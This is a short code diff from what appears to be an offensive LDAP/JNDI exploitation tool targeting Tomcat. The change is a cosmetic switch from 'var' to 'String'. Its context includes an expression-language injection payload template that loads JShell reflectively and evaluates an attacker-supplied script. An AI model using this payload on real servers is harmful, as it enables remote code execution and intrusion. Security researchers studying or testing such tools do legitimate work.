@@ -46,7 +46,7 @@ public class TomcatJShell implements LdapController {
         } else {
             System.out.println("Using payload from " + Config.jshellPayloadPath);
 
-            var jshellScript = Files.readString(Path.of(Config.jshellPayloadPath))
+            String jshellScript = Files.readString(Path.of(Config.jshellPayloadPath))
                     .replace("\"", "\\\"");
 
             payload = "{\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"${script}\")}"
